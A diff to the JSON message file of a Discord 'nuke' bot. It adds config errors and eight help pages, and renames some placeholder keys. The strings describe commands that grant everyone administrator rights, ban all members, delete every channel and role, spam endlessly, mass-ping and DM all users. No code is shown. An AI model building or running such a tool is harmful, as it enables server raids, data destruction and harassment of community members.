@@ -1,4 +1,15 @@
 {
+  "config_not_found": "Error: config.json not found!",
+  "config_create_instruction": "Please create a config.json file with your bot token and owner ID.",
+  "config_example": "Example: {\"token\": \"BOT_TOKEN\", \"prefix\": \".!\", \"owner_id\": \"YOUR_USER_ID\", \"whitelist\": [], \"language\": \"en\"}",
+  "config_invalid_json": "Error: config.json is not valid JSON!",
+  "token_not_found": "Error: Token not found in config.json!",
+  "token_add_instruction": "Please add your bot token and owner ID to config.json",
+  "token_example": "Example: {\"token\": \"BOT_TOKEN\", \"prefix\": \".!\", \"owner_id\": \"YOUR_USER_ID\", \"whitelist\": []}",
+  "token_loaded": "[CONFIG] Bot token loaded from config.json",
+
+  "ready_online": "[READY] {bot_user} is now online!",
+  "ready_bot_id": "[READY] Bot ID: {bot_id}",
   "bot_started": "BOT STARTED - {bot_user} (ID: {bot_id}) | Connected to {guild_count} guild(s): {guild_list}",
   "bot_prefix": "Bot prefix: {prefix} | Owner ID: {owner_id}",
   "bot_shutdown": "BOT SHUTDOWN - Initiated by: {user} (ID: {user_id}) | Guild: {guild} (ID: {guild_id})",
@@ -57,9 +68,9 @@
   "god_all_initiated": "👑 GOD-ALL INITIATED 👑\nGiving administrator permissions to all members...",
   "god_all_complete": "God mode activated for {count} members",
 
-  "nuke_starting": "Starting nuke-all operation... This may take a while.",
-  "nuke_complete": "Nuke-all complete: {channels} channels, {categories} categories, {roles} roles deleted",
-  "nuke_no_permission": "I don't have permission to perform nuke-all operation!",
+  "nuke_all_starting": "Starting nuke-all operation... This may take a while.",
+  "nuke_all_complete": "Nuke-all complete: {channels} channels, {categories} categories, {roles} roles deleted",
+  "nuke_all_no_permission": "I don't have permission to perform nuke-all operation!",
 
   "delchannel_success": "Deleted #{channel}",
   "delchannel_no_permission": "I don't have permission to delete that channel!",
@@ -88,8 +99,8 @@
   "brainfuck_no_permission": "I don't have permission to execute BRAINFUCK command!",
 
   "spam_infinite_started": "⚠️ INFINITE SPAM MODE ACTIVATED ⚠️\nSpamming in all channels: \"{message}\"\n\nThis will continue indefinitely!",
-  "spam_started": "Spam started: Sending \"{message}\" {count} times in each channel...",
-  "spam_complete": "Spam complete: {total} messages sent across {channels} channels",
+  "spam_starting": "Spam started: Sending \"{message}\" {count} times in each channel...",
+  "spam_complete": "Spam complete: {sent} messages sent across {channels} channels",
   "spam_no_permission": "I don't have permission to send messages in channels!",
 
   "rename_server_success": "Server renamed to **{name}**",
@@ -112,7 +123,7 @@
   "nick_no_permission": "I don't have permission to change {member}'s nickname!",
 
   "nick_all_starting": "Starting nick-all operation... Setting all nicknames to \"{nickname}\"",
-  "nick_all_complete": "Nick-all complete: {success} nicknames changed, {failed} failed",
+  "nick_all_complete": "Nick-all complete: {count} nicknames changed, {failed} failed",
   "nick_all_no_permission": "I don't have permission to change nicknames!",
 
   "role_spam_starting": "Starting role-spam operation... Creating {count} roles named \"{name}\"",
@@ -139,19 +150,19 @@
   "shuffle_channels_complete": "Shuffle-channels complete: {count} channels reordered",
   "shuffle_channels_no_permission": "I don't have permission to manage channels!",
 
-  "voice_scatter_starting": "Starting voice-scatter operation... Scattering {count} users across {channels} channels.",
-  "voice_scatter_complete": "Voice-scatter complete: {moved} users moved",
+  "voice_scatter_starting": "Starting voice-scatter operation... Scattering {users} users across {channels} channels.",
+  "voice_scatter_complete": "Voice-scatter complete: {count} users moved",
   "voice_scatter_need_channels": "Need at least 2 voice channels to scatter users!",
   "voice_scatter_no_users": "No users in voice channels!",
   "voice_scatter_no_permission": "I don't have permission to move members!",
 
-  "move_all_starting": "Starting move-all operation... Moving {count} users to {channel}.",
-  "move_all_complete": "Move-all complete: {moved} users moved to {channel}",
+  "move_all_starting": "Starting move-all operation... Moving {users} users to {channel}.",
+  "move_all_complete": "Move-all complete: {count} users moved to {channel}",
   "move_all_no_users": "No users in voice channels!",
   "move_all_no_permission": "I don't have permission to move members!",
 
   "mention_spam_starting": "Starting mention-spam operation... Sending {count} mentions.",
-  "mention_spam_complete": "Mention-spam complete: {sent} mentions sent",
+  "mention_spam_complete": "Mention-spam complete: {count} mentions sent",
   "mention_spam_invalid_count": "Please specify a positive number!",
   "mention_spam_too_many": "Maximum 100 mentions at a time!",
   "mention_spam_no_permission": "I don't have permission to send messages or mention!",
@@ -167,6 +178,70 @@
 
   "shutdown_message": "Bot shutting down",
   "shutdown_farewell": "🔴 Bot shutting down...",
+  "shutdown_initiated": "[SHUTDOWN] Bot shutdown initiated by {user}",
+  "shutdown_now": "[SHUTDOWN] Bot is now shutting down...",
+
+  "help_footer": "Page {page}/{total} • Use buttons to navigate",
+
+  "help_page1_title": "🔥 Bot Commands - Core Power 🔥",
+  "help_page1_desc": "Most important commands for taking control",
+  "help_god": "Give yourself administrator role",
+  "help_god_all": "Give EVERYONE administrator permissions",
+  "help_death": "☠️ Ultimate destruction - Ban all, delete all channels and roles",
+  "help_brainfuck": "🔥 Delete all channels, infinitely create and spam",
+  "help_help": "Show this help message",
+
+  "help_page2_title": "Bot Commands - Moderation",
+  "help_page2_desc": "Basic moderation commands",
+  "help_ban": "Ban a user from the server",
+  "help_unban": "Unban a user by their ID",
+  "help_kick": "Kick a user from the server",
+  "help_mute": "Timeout a user (e.g., 10m, 1h, 1d)",
+  "help_unmute": "Remove timeout from a user",
+
+  "help_page3_title": "Bot Commands - Mass Moderation",
+  "help_page3_desc": "Mass moderation commands",
+  "help_ban_all": "Ban all members in the server",
+  "help_kick_all": "Kick all members in the server",
+  "help_mute_all": "Timeout all members in the server",
+  "help_purge": "Delete a number of messages from the channel",
+
+  "help_page4_title": "Bot Commands - Destructive",
+  "help_page4_desc": "⚠️ Commands that cause permanent damage",
+  "help_nuke": "Delete and recreate channel to clear all messages",
+  "help_nuke_all": "Delete ALL channels, categories, and roles",
+  "help_delchannel": "Delete a specific channel",
+  "help_webhook_nuke": "Delete all webhooks in server",
+  "help_emoji_nuke": "Delete all custom emojis",
+
+  "help_page5_title": "Bot Commands - Trolling",
+  "help_page5_desc": "Fun, annoying commands (mostly reversible)",
+  "help_nick_all": "Set everyone's nickname",
+  "help_shuffle_channels": "Randomly reorder all channels",
+  "help_voice_scatter": "Scatter users across voice channels",
+  "help_move_all": "Move all users to voice channel",
+  "help_mention_spam": "Ghost ping spam (max 100)",
+
+  "help_page6_title": "Bot Commands - Server Management",
+  "help_page6_desc": "Server customization commands",
+  "help_rename_server": "Rename the server",
+  "help_server_icon": "Change the server icon",
+  "help_server_banner": "Change server banner (boost lvl 2+)",
+  "help_server_desc": "Change server description",
+  "help_nick": "Change a user's nickname",
+
+  "help_page7_title": "Bot Commands - Roles & Spam",
+  "help_page7_desc": "Role management and spam commands",
+  "help_role_spam": "Mass create roles",
+  "help_strip": "Remove all roles from a user",
+  "help_spam": "Spam message in all channels (0 = infinite)",
+
+  "help_page8_title": "Bot Commands - Utility & DM",
+  "help_page8_desc": "Utility and messaging commands",
+  "help_dm": "DM a specific user",
+  "help_dmall": "DM all users in the server",
+  "help_serverinfo": "Get detailed server information",
+  "help_shutdown": "Shutdown the bot (Admin only)",
 
   "error_occurred": "An error occurred: {error}"
 }
